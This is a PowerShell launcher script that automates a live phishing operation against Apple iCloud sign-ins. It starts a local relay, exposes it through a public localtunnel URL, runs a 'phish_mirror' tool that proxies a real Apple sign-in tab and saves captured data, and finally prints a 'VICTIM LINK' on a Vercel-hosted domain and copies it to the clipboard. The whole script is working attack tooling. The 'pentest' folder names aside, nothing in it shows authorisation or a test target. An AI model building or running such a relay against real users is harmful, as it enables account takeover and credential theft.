# Plan A one-shot — stable mirror tree at C:\Users\Admin\harbor_run
param(
    [string]$Session = "op1",
    [string]$Harbor = "https://harbor-ten-lake.vercel.app",
    [int]$RelayPort = 8931
)

$ErrorActionPreference = "Stop"
$HarborRoot = "D:\pentest\apple\icloud\harbor"
$Tools = Join-Path $HarborRoot "tools"
$HarborRun = "C:\Users\Admin\harbor_run"
$Patch = Join-Path $env:USERPROFILE ".cursor\projects\d-pentest-apple-icloud\apply_mirror_patch.py"
$PythonExe = "C:\Users\Admin\AppData\Local\hermes\hermes-agent\venv\Scripts\python.exe"
if (-not (Test-Path $PythonExe)) {
    $PythonExe = (Get-Command python -ErrorAction Stop).Source
}

function Stop-All {
    foreach ($pass in 1..2) {
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
            Where-Object { $_.CommandLine -match 'phish_mirror\.py|phish_relay\.py|localtunnel --port 8931' } |
            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
        Start-Sleep -Seconds 1
    }
    Get-ChildItem (Join-Path $env:TEMP "harbor-mirror-locks") -Filter "relay-*-$Session.lock" -ErrorAction SilentlyContinue |
        Remove-Item -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
}

Write-Host "Patching mirror..." -ForegroundColor Cyan
& $PythonExe $Patch
if ($LASTEXITCODE -ne 0) {
    if (-not (Test-Path (Join-Path $HarborRun 'phish_mirror.py'))) {
        throw "apply_mirror_patch failed and no harbor_run mirror"
    }
    Write-Host "Patch script had D: warnings; continuing with harbor_run mirror" -ForegroundColor Yellow
}

Stop-All

Write-Host "Starting relay..." -ForegroundColor Cyan
Start-Process powershell -WindowStyle Minimized -ArgumentList @(
    '-NoProfile', '-Command', "Set-Location '$HarborRun'; & '$PythonExe' phish_relay.py --port $RelayPort"
) | Out-Null
for ($i = 0; $i -lt 30; $i++) {
    try {
        $null = Invoke-RestMethod "http://127.0.0.1:$RelayPort/" -TimeoutSec 3
        break
    } catch { Start-Sleep -Seconds 1 }
}

$LtLog = Join-Path $Tools "localtunnel.log"
Remove-Item $LtLog -Force -ErrorAction SilentlyContinue
Write-Host "Starting tunnel..." -ForegroundColor Cyan
Start-Process powershell -WindowStyle Minimized -ArgumentList @(
    '-NoProfile', '-Command',
    "npx --yes localtunnel --port $RelayPort 2>&1 | Tee-Object -FilePath '$LtLog'"
) | Out-Null
$fwd = $null
for ($i = 0; $i -lt 60; $i++) {
    if (Test-Path $LtLog) {
        $raw = Get-Content $LtLog -Raw -ErrorAction SilentlyContinue
        if ($raw -match '(https://[^\s]+\.loca\.lt)') { $fwd = $Matches[1]; break }
    }
    Start-Sleep -Seconds 2
}
if (-not $fwd) { throw "Tunnel did not start" }
Set-Content (Join-Path $Tools "tunnel-url.txt") $fwd -NoNewline
Write-Host "Tunnel: $fwd" -ForegroundColor Green

$py = $PythonExe
$lockFile = Join-Path $env:TEMP "harbor-mirror-locks\relay-${RelayPort}-${Session}.lock"
Remove-Item $lockFile -Force -ErrorAction SilentlyContinue

Write-Host "Starting mirror..." -ForegroundColor Cyan
$mirrorArgs = @(
    'phish_mirror.py', '--remote',
    '--relay', "http://127.0.0.1:$RelayPort",
    '--public-relay', $fwd,
    '--relay-port', '0',
    '--session', $Session,
    '--harbor', $Harbor,
    '--channel', 'chrome',
    '--out', 'captured'
)
Start-Process -FilePath $py -ArgumentList $mirrorArgs -WorkingDirectory $HarborRun -WindowStyle Normal | Out-Null

$holder = $null
for ($i = 0; $i -lt 90; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $lockFile) {
        $holder = (Get-Content $lockFile -ErrorAction SilentlyContinue).Trim()
        if ($holder -match '^\d+$' -and (Get-Process -Id ([int]$holder) -ErrorAction SilentlyContinue)) { break }
    }
}
if (-not $holder) { throw "Mirror did not start" }
Write-Host "Mirror PID: $holder (lock holder)" -ForegroundColor Green
Write-Host "Waiting for Apple sign-in tab (~35s)..." -ForegroundColor DarkGray
Start-Sleep -Seconds 35

Set-Location $HarborRun
$env:FWD = $fwd
$env:SESSION = $Session
& $PythonExe test_remote_relay.py
if ($LASTEXITCODE -ne 0) {
    Write-Host "Self-test warning (stack may still work). Check mirror window + victim link." -ForegroundColor Yellow
}
Invoke-RestMethod "http://127.0.0.1:$RelayPort/relay/reset?session=$Session" -TimeoutSec 5 | Out-Null

if (-not (Get-Process -Id ([int]$holder) -ErrorAction SilentlyContinue)) {
    Write-Host "Mirror exited — restarting once..." -ForegroundColor Yellow
    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
    Start-Process -FilePath $py -ArgumentList $mirrorArgs -WorkingDirectory $HarborRun -WindowStyle Normal | Out-Null
    for ($i = 0; $i -lt 90; $i++) {
        Start-Sleep -Seconds 1
        if (Test-Path $lockFile) {
            $holder = (Get-Content $lockFile -ErrorAction SilentlyContinue).Trim()
            if ($holder -match '^\d+$' -and (Get-Process -Id ([int]$holder) -ErrorAction SilentlyContinue)) { break }
        }
    }
    Start-Sleep -Seconds 35
}

$victim = "$Harbor/signin?sid=$Session&fwd=" + [uri]::EscapeDataString($fwd)
Write-Host ""
Write-Host "VICTIM LINK:" -ForegroundColor Green
Write-Host $victim
Set-Clipboard $victim -ErrorAction SilentlyContinue
